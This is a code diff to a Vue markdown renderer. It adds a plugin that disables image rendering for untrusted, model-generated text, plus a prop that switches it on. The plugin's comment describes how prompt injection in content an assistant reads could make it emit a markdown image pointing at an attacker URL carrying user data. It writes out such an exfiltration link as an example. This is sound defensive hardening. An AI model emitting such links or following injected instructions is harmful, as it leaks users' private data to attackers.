@@ -1,6 +1,6 @@
 <template>
   <div ref="container" class="markdown-renderer">
-    <vue-markdown :source="source" :plugins="[geojsonPlugin, mermaidPlugin]" />
+    <vue-markdown :source="source" :plugins="plugins" />
 
     <v-dialog v-model="showDiagramModal" max-width="95vw">
       <v-card class="rounded-lg d-flex flex-column" style="height: 90vh;">
@@ -100,10 +100,20 @@ function geojsonPlugin(md) {
         return defaultFenceRenderer(tokens, idx, options, env, self)
     }
 }
+
+/**
+ * Disables markdown image syntax. Images load automatically, so for text we don't
+ * fully control (Pip's model output, which can be steered by prompt injection in
+ * content it reads) `![](https://attacker/?data=…)` would leak data the moment
+ * the message renders.
+ */
+function noImagesPlugin(md) {
+    md.disable('image')
+}
 </script>
 
 <script setup>
-import { ref, onMounted, onBeforeUnmount, watch, nextTick } from 'vue'
+import { ref, computed, onMounted, onBeforeUnmount, watch, nextTick } from 'vue'
 import { useRouter } from 'vue-router'
 import VueMarkdown from 'vue-markdown-render'
 import DOMPurify from 'dompurify'
@@ -122,8 +132,17 @@ const props = defineProps({
     streaming: {
         type: Boolean,
         default: false
+    },
+    // Set false for untrusted/model-generated text; see noImagesPlugin.
+    allowImages: {
+        type: Boolean,
+        default: true
     }
 })
+
+const plugins = computed(() => props.allowImages
+    ? [geojsonPlugin, mermaidPlugin]
+    : [geojsonPlugin, mermaidPlugin, noImagesPlugin])
 
 const router = useRouter()
 const container = ref(null)
